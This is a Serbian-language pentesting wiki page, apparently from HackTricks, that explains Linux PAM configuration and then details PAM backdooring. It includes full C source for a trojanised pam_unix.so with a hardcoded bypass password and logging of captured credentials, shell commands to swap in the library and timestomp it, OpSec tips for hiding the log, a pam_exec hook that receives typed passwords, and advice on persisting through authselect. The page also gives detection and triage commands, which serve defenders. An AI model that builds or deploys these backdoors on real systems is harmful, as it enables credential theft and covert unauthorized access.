# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Osnovne informacije

**PAM (Pluggable Authentication Modules)** funkcioniše kao bezbednosni mehanizam koji **proverava identitet korisnika koji pokušavaju da pristupe računarskim servisima**, kontrolišući njihov pristup na osnovu različitih kriterijuma. Sličan je digitalnom vrataru koji obezbeđuje da samo ovlašćeni korisnici mogu da koriste određene servise, uz mogućnost ograničavanja njihovog korišćenja radi sprečavanja preopterećenja sistema.

#### Konfiguracioni fajlovi

- **Solaris i UNIX-based sistemi** obično koriste centralni konfiguracioni fajl koji se nalazi na putanji `/etc/pam.conf`.
- **Linux sistemi** preferiraju pristup sa direktorijumom i čuvaju konfiguracije specifične za servise u direktorijumu `/etc/pam.d`. Na primer, konfiguracioni fajl za login servis nalazi se na putanji `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Primer PAM konfiguracije za login servis može izgledati ovako:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Ovi realms, odnosno management grupe, obuhvataju **auth**, **account**, **password** i **session**, pri čemu je svaki odgovoran za različite aspekte procesa authentication i session management-a:<sup>[[1]](#references)</sup>

- **Auth**: Proverava identitet korisnika, često zahtevajući unos password-a.
- **Account**: Obavlja verifikaciju account-a, proveravajući uslove kao što su članstvo u grupi ili ograničenja u zavisnosti od doba dana.
- **Password**: Upravlja ažuriranjem password-a, uključujući proveru složenosti i prevenciju dictionary attacks.
- **Session**: Upravlja radnjama tokom pokretanja ili završetka service session-a, kao što su mountovanje direktorijuma ili postavljanje resource limits.

#### **PAM Module Controls**

Controls određuju reakciju module-a na uspeh ili neuspeh i utiču na celokupan authentication process. U njih spadaju:<sup>[[1]](#references)</sup>

- **Required**: Neuspeh required module-a dovodi do konačnog neuspeha, ali tek nakon provere svih narednih module-a.
- **Requisite**: Trenutno prekida process nakon neuspeha.
- **Sufficient**: Uspeh preskače preostale provere u istom realm-u, osim ako naredni module ne doživi neuspeh.
- **Optional**: Dovodi do neuspeha samo ako je jedini module u stack-u.

#### Ofanzivna semantika koja je važna

Prilikom backdooring-a PAM-a, **lokacija ubačenog pravila** često je važnija od samog payload-a:

- `include` i `substack` preuzimaju pravila iz drugih fajlova, tako da izmena `sshd` može uticati samo na SSH, dok izmena `system-auth`, `common-auth` ili drugog shared stack-a može istovremeno uticati na više service-a.
- PAM takođe podržava kontrole u uglastim zagradama, kao što je `[success=1 default=ignore]`. One se mogu zloupotrebiti za **preskakanje jednog ili više module-a** nakon uspešne custom provere, umesto vidljive zamene `pam_unix.so`.
- `module-path` može biti **apsolutan** (`/usr/lib/security/pam_custom.so`) ili **relativan** u odnosu na podrazumevani PAM module directory. Na modernim Linux sistemima stvarni direktorijumi su često `/lib/security`, `/lib64/security`, `/usr/lib/security` ili multiarch putanje kao što je `/usr/lib/x86_64-linux-gnu/security`.

Kratak operator takeaway: uvek mapirajte **ceo service graph** pre patching-a. Na primer, `sshd -> password-auth -> system-auth` na nekim distro-ima ili `sshd -> system-remote-login -> system-login -> system-auth` na drugima znači da isti implant od jedne linije može imati mnogo širi domet nego što je planirano.

#### Example Scenario

U setup-u sa više auth module-a, process prati strogo definisan redosled. Ako module `pam_securetty` utvrdi da login terminal nije autorizovan, root login-i se blokiraju, ali se svi module-i i dalje obrađuju zbog njegovog statusa "required". `pam_env` postavlja environment variables, što potencijalno poboljšava user experience. Module-i `pam_ldap` i `pam_unix` zajedno obavljaju authentication korisnika, pri čemu `pam_unix` pokušava da upotrebi prethodno uneti password, čime se poboljšavaju efikasnost i fleksibilnost authentication methods.


## Backdooring PAM-a – Hooking `pam_unix.so`

Klasičan persistence trik u Linux okruženjima visoke vrednosti jeste **zamena legitimne PAM library trojanised drop-in-om**. Pošto se svaki SSH / console login na kraju poziva `pam_unix.so:pam_sm_authenticate()`, nekoliko linija C koda dovoljno je za capture credentials-a ili implementaciju *magic* password bypass-a.<sup>[[2]](#references)</sup>

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Kompajliraj i neprimetno zameni:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec saveti
1. **Atomsko prepisivanje** – upišite u privremenu datoteku, a zatim izvršite `mv` da biste je postavili na odredište i izbegli napola upisane biblioteke koje bi zaključale SSH.
2. Postavljanje log datoteke, kao što je `/usr/bin/.dbus.log`, uklapa se među legitimne desktop artefakte.
3. Izvozi simbola moraju ostati identični (`pam_sm_setcred`, itd.) kako bi se izbeglo nepravilno ponašanje PAM-a.

### Otkrivanje
* Uporedite MD5/SHA256 vrednost `pam_unix.so` sa paketom distribucije.
* `rpm -V pam` ili `debsums -s libpam-modules` mogu otkriti zamenjene biblioteke bez ručnog izračunavanja hash vrednosti.
* Proverite da li u okviru `/lib/security/` postoje datoteke sa dozvolom upisa za sve korisnike ili neuobičajenim vlasništvom.
* Pravilo za `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Pretražite PAM konfiguracije u potrazi za neočekivanim modulima: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Komande za brzu trijažu (nakon kompromitovanja ili tokom threat hunting-a)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Zloupotreba `pam_exec` za persistence
Umesto zamene `pam_unix.so`, blaži pristup je da dodate `pam_exec` liniju u `/etc/pam.d/sshd`, tako da svaki SSH login pokrene implant, dok normalni stek ostaje nepromenjen:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` prima PAM metadata u promenljivama okruženja kao što su `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` i `PAM_TYPE`. Uz `expose_authtok`, helper takođe može da pročita lozinku sa `stdin` tokom `auth` ili `password` faza. Ako želite da se helper pokrene sa effective UID umesto sa real UID, dodajte `seteuid`.

Praktične napomene:

- `session optional pam_exec.so ...` je pogodniji za **post-login actions**, kao što su ponovno otvaranje socket-a ili pokretanje detached daemon-a.
- `auth optional pam_exec.so quiet expose_authtok ...` je uobičajen izbor za **credential capture**, jer se izvršava pre otvaranja session-a.
- `type=session` ili `type=auth` mogu se koristiti za ograničavanje izvršavanja na određenu PAM fazu i izbegavanje bučnog dvostrukog izvršavanja.

### Preživljavanje distro tooling-a: `authselect`

Na RHEL, CentOS Stream, Fedora i derivatima, direktne izmene generisanih fajlova kao što su `/etc/pam.d/system-auth` ili `/etc/pam.d/password-auth` može **overwritovati `authselect`**. Radi persistence-a, operatori često menjaju aktivni custom profile u `/etc/authselect/custom/<profile>/`, a zatim ga ponovo izaberu ili primene.

Uobičajeni workflow kada imate root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Ovo je važno i za ofanzivne aktivnosti i za triage: ako `/etc/pam.d/system-auth` sadrži banner `Generated by authselect` i `Do not modify this file manually`, stvarna persistence tačka možda se nalazi u `/etc/authselect/custom/`, a ne u `/etc/pam.d/`.

### Nedavno uočen tradecraft

Nedavni izveštaji iz 2025. godine o **Plague** Linux backdooru pokazali su istu osnovnu ideju, ali primenjenu na napredniji način: malicious PAM komponentu sa **static bypass password**, uz brisanje SSH-related environment variables i shell history-ja (`HISTFILE=/dev/null)` kako bi se smanjili tragovi sesije nakon prijavljivanja.<sup>[[3]](#references)</sup> Ovo je koristan hunting pattern zato što logika backdoora može biti smeštena u PAM-u, dok se stealth artifacts pojavljuju tek **nakon** uspešne authentication.


## Reference

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [The Covert Operator's Playbook: Infiltration of Global Telecom Networks - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
